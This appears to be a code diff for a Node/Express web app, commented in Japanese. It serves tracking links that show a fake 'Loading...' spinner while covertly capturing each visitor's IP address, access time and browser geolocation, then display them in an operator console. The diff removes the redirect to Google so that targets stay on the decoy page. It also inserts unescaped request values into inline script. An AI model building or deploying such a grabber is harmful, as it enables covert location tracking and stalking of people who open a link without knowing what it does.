@@ -12,7 +12,7 @@ function generateId() {
          Math.random().toString(36).substring(2, 6);
 }
 
-// ===== 元のデザイン（一切変更なし） =====
+// ===== HTML（デザイン元のまま） =====
 const HTML = `<!DOCTYPE html>
 <html>
 <head>
@@ -119,8 +119,9 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
       if (cmd === '') return;
       addCmdOutput('> ' + cmd, 'cmd-echo');
 
-      // ★ /相手の名前info → 最後にアクセスした人のデータを表示
-      if (cmd.endsWith('info')) {
+      // ★ /名前info → 最後にアクセスした人のデータを表示
+      const cmdLower = cmd.toLowerCase();
+      if (cmdLower.endsWith('info') && cmd.startsWith('/')) {
         const d = window._lastLog;
         if (!d) {
           addCmdOutput('  [ データなし ]', 'cmd-error');
@@ -277,7 +278,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 </body>
 </html>`;
 
-// ===== サーバーサイド =====
+// ===== サーバー =====
 app.get('/', (req, res) => {
   res.send(HTML);
 });
@@ -295,36 +296,40 @@ app.get('/t/:id', (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP不明';
   const time = new Date().toLocaleString('ja-JP');
 
+  // ★ 相手の画面：Loading表示だけで、Googleに飛ばない
   res.send(`
     <!DOCTYPE html>
     <html>
-    <head><meta charset="UTF-8"><title>Loading...</title>
-    <style>
-      * { margin:0; padding:0; box-sizing:border-box; }
-      body { background:#0a0e14; height:100vh; display:flex; justify-content:center; align-items:center; flex-direction:column; font-family:'Segoe UI',sans-serif; }
-      .spinner { width:40px; height:40px; border:3px solid #1a2a3a; border-top:3px solid #4a8ada; border-radius:50%; animation:spin 1s linear infinite; }
-      @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
-      .msg { color:#6688aa; font-size:16px; margin-top:24px; letter-spacing:1px; }
-      .sub { color:#334455; font-size:13px; margin-top:8px; }
-    </style>
-    <script>
-      function sendLocation(lat, lon) {
-        fetch('/location', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: '${id}', name: '${name}', ip: '${ip}', time: '${time}', lat: lat, lon: lon })
-        });
-      }
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function(pos) { sendLocation(pos.coords.latitude, pos.coords.longitude); },
-          function() { sendLocation(null, null); }
-        );
-      } else { sendLocation(null, null); }
-      setTimeout(function() {
-        window.location.href = 'https://www.google.com';
-      }, 1800);
-    </script>
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Loading...</title>
+      <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#0a0e14; height:100vh; display:flex; justify-content:center; align-items:center; flex-direction:column; font-family:'Segoe UI',sans-serif; }
+        .spinner { width:40px; height:40px; border:3px solid #1a2a3a; border-top:3px solid #4a8ada; border-radius:50%; animation:spin 1s linear infinite; }
+        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
+        .msg { color:#6688aa; font-size:16px; margin-top:24px; letter-spacing:1px; }
+        .sub { color:#334455; font-size:13px; margin-top:8px; }
+      </style>
+      <script>
+        function sendLocation(lat, lon) {
+          fetch('/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ id: '${id}', name: '${name}', ip: '${ip}', time: '${time}', lat: lat, lon: lon })
+          });
+        }
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            function(pos) { sendLocation(pos.coords.latitude, pos.coords.longitude); },
+            function() { sendLocation(null, null); }
+          );
+        } else {
+          sendLocation(null, null);
+        }
+        // ★ Googleに飛ばない！
+      </script>
     </head>
     <body>
       <div class="spinner"></div>
